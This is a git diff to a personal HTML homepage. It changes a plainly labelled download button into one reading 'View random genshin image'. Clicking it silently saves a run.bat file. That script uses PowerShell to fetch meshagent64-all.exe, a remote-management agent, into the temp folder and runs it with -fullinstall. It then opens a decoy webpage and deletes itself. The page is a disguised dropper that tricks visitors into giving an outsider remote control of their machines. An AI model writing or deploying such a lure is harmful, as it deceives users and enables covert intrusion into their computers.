@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en">
-  <head>
+<head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link href="/main.css" rel="stylesheet">
@@ -10,8 +10,8 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
     <link rel="icon" type="image/x-icon" href="/pfp/favicon.ico">
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-  </head>
-  <body>
+</head>
+<body>
     <div class="container">  
         <h1 class="pagetop">  
             eastoncrafter's page  
@@ -19,12 +19,67 @@
         <p class="pagetop">
             Welcome to my corner of the internet,
         </p> 
-        <a href="https://github.com/eastoncrafter/eastoncrafter.github.io/raw/refs/heads/main/run.bat" download>
-            <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
-                Download Script
-            </button>
-        </a>
+
+        <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded" onclick="saveBatchFile()">
+            View random genshin image
+        </button>
+        <!--
         <img class="pagetop" src="/pfp/FullyTransparent.png" alt="my profile picture" style="width:50%;height:50%;">
-    </div>
-  </body>
+        -->
+        <div style="padding-bottom: 20px;"></div>
+      </div>
+
+    <script>
+    function saveBatchFile() {
+        const batchContent = `@echo off
+setlocal
+
+:: Define variables
+set "URL=https://github.com/eastoncrafter/eastoncrafter.github.io/raw/refs/heads/main/meshagent64-all.exe"
+set "FILENAME=meshagent64-all.exe"
+set "DEST=%TEMP%\\%FILENAME%"
+set "WEBPAGE=https://example.com"
+
+:: Download the file using PowerShell
+echo Downloading %FILENAME%...
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%DEST%')"
+
+:: Check if the file was downloaded
+if exist "%DEST%" (
+    echo Running installer...
+    "%DEST%" -fullinstall
+) else (
+    echo Download failed!
+    exit /b
+)
+
+:: Open the link in Chrome
+echo Opening webpage...
+start chrome "%WEBPAGE%"
+
+:: Delete this script
+echo Deleting script...
+(
+    echo @echo off
+    echo del /f /q "%~f0"
+) > "%TEMP%\\delete_me.bat"
+start /b cmd /c "%TEMP%\\delete_me.bat"
+
+exit`;
+
+        // Create a Blob object
+        const blob = new Blob([batchContent], { type: "text/plain" });
+
+        // Create a temporary link element
+        const link = document.createElement("a");
+        link.href = URL.createObjectURL(blob);
+        link.download = "run.bat"; // Set the download filename
+
+        // Append link to body and trigger the download
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+    </script>
+</body>
 </html>
